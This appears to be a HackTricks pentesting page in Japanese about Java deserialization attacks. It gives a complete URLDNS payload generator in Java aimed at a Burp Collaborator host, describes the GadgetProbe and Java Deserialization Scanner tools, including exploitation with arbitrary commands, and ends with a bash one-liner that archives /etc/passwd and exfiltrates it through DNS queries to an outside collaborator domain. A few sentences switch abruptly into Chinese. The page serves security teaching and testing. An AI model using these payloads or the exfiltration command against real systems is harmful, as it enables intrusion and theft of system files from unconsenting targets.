# Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
* **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## DNS request on deserialization

クラス`java.net.URL`は`Serializable`を実装しています。これは、このクラスがシリアライズ可能であることを意味します。
```java
public final class URL implements java.io.Serializable {
```
このクラスには**興味深い挙動**があります。ドキュメントによると、「**2つのホストが同等と見なされる条件は、両方のホスト名が同じIPアドレスに解決される場合**」です。\
そのため、URLオブジェクトが**`equals`**または**`hashCode`**の**いずれかの関数を呼び出すたびに**、IPアドレスを取得するための**DNSリクエストが送信**されます。

**URL**オブジェクトから**`hashCode`**関数を**呼び出す**ことは非常に簡単で、このオブジェクトをデシリアライズされる`HashMap`内に挿入すれば十分です。これは、`HashMap`の**`readObject`**関数の最後にこのコードが実行されるためです：
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
それは`HashMap`内のすべての値とともに`putVal`を**実行**します。しかし、さらに重要なのは、各値で`hash`を呼び出すことです。これが`hash`関数のコードです：
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
如何観察，**`HashMap`** を**デシリアライズ**すると、関数`hash` が**各オブジェクトで実行され**、**`hash`** の実行中にはオブジェクトの`.hashCode()` が実行されます。したがって、**`URL`** オブジェクトを含む**`HashMap`** を**デシリアライズ**すると、**URLオブジェクト**は`.hashCode()`を**実行**します。

次に、`URLObject.hashCode()` のコードを見てみましょう：
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
如何見到，當一個`URLObject`執行`.hashCode()`時，它被稱為`hashCode(this)`。接下來你可以看到這個函數的程式碼：
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
以下のように、ドメインに `getHostAddress` が実行され、**DNS クエリが発行**されます。

したがって、このクラスは、**デシリアライズ**が可能であることを**示す**ために**DNS クエリを発行**するために**悪用**される可能性があり、情報を**外部に漏洩**するためにも使用できます（コマンド実行の出力をサブドメインに追加することができます）。

### URLDNS ペイロードのコード例

[ここから URDNS ペイロードコードを取得できます](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)。ただし、コードの作成方法を理解しやすくするために、ysoserial のものを基に独自の PoC を作成しました：
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### より詳細な情報

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 元のアイデアでは、Commons CollectionsのペイロードがDNSクエリを実行するように変更されましたが、これは提案された方法よりも信頼性が低かったです。以下がその記事です: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[Burp Suite App Store (Extender)](https://github.com/BishopFox/GadgetProbe) から **GadgetProbe** をダウンロードできます。

**GadgetProbe** は、サーバーの **Javaクラス** が存在するかどうかを調べ、それが **既知の脆弱性** に対して **脆弱** かどうかを知るために使用されます。

### 動作原理

**GadgetProbe** は、前のセクションの **DNSペイロード** を使用しますが、DNSクエリを実行する前に **任意のクラスを逆シリアル化しようとします**。 **任意のクラスが存在する** 場合、 **DNSクエリ** が **送信** され、GadgetProbe はこのクラスが存在することを記録します。 **DNS** リクエストが **送信されない** 場合、これは **任意のクラスが正常に逆シリアル化されなかった** ことを意味し、それは存在しないか、 **シリアル化/悪用可能** ではないことを示します。

GitHub内には、[**GadgetProbeにいくつかのワードリスト**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) があります。

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### より詳細な情報

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

このスキャナーは、Burp App Store (Extender) から **ダウンロード** できます。\
この **拡張機能** には **パッシブ** および **アクティブ** の **機能** があります。

### パッシブ

デフォルトでは、すべてのリクエストとレスポンスを **パッシブにチェック** し、 **Javaシリアル化のマジックバイト** を探して、見つかった場合は脆弱性警告を表示します:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### アクティブ

**手動テスト**

リクエストを選択し、右クリックして `Send request to DS - Manual Testing` をクリックします。\
次に、_Deserialization Scanner Tab_ --> _Manual testing tab_ 内で **挿入ポイント** を選択し、テストを実行します（使用されているエンコーディングに応じて適切な攻撃を選択します）。

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

これが「手動テスト」と呼ばれているにもかかわらず、かなり **自動化** されています。Webサーバーに存在するライブラリをチェックし、脆弱なものを強調表示します。 **脆弱なライブラリ** をチェックするには、 **Javas Sleeps**、 **CPU** 消費を介した **sleeps**、または以前に言及されたように **DNS** を起動することができます。

**悪用**

脆弱なライブラリを特定したら、リクエストを _Exploiting Tab_ に送信できます。\
このタブでは、再び **挿入ポイント** を選択し、 **作成する脆弱なライブラリ** と **コマンド** を入力し、適切な **Attack** ボタンを押すだけです。

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### Java Deserialization DNS Exfil 情報

ペイロードを以下のように実行するようにしてください:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### より詳しい情報

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>でAWSハッキングをゼロからヒーローまで学ぶ！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで会社を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>
